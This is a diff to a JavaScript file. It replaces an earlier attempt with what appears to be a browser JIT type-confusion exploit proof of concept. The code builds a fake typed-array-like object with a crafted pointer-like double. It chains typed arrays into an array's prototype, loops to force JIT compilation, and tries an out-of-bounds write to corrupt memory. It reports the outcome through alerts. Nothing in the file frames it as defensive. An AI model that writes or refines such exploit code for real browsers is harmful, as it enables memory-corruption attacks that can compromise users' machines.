@@ -42,6 +42,7 @@ function main() {
 main();
 */
 
+/* v1
 // Set this to 10 or so to see correct result
 const NUM_ITERATIONS = 10;
 const ARRAY_LENGTH = 100;
@@ -92,6 +93,45 @@ function main() {
         let r = f(obj, idx);
         alert('Result: ' + r);
     }
+}
+
+main();
+*/
+
+
+// Run with increased iterations for JIT compilation
+const NUM_ITERATIONS = 1000;
+const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
+let ab = new ArrayBuffer(0x1000);
+let x = {buffer: ab, length: 13.39, byteOffset: 13.40, data: 3.54484805889626e-310};
+let y = new Uint32Array(ab);
+let TARGET = { secret: 0x12345678 };
+
+function v7(v8, v9) {
+    if (v4.length == 0) {
+        v4[3] = y;
+        alert('v4[3] set to y');
+    }
+    const v11 = v4.pop();
+    try {
+        v11[0] = 0x1337; // محاولة الكتابة
+        alert('Write to v11[0] succeeded with value: ' + v11[0]);
+    } catch (e) {
+        alert('Crash or Type Confusion: ' + e);
+    }
+    for (let v15 = 0; v15 < 100; v15++) {} // Force JIT
+}
+
+var p = {};
+p.__proto__ = [y, y, y];
+p[0] = x;
+v4.__proto__ = p;
+
+function main() {
+    for (let v31 = 0; v31 < NUM_ITERATIONS; v31++) {
+        v7();
+    }
+    alert('TARGET.secret = ' + TARGET.secret);
 }
 
 main();
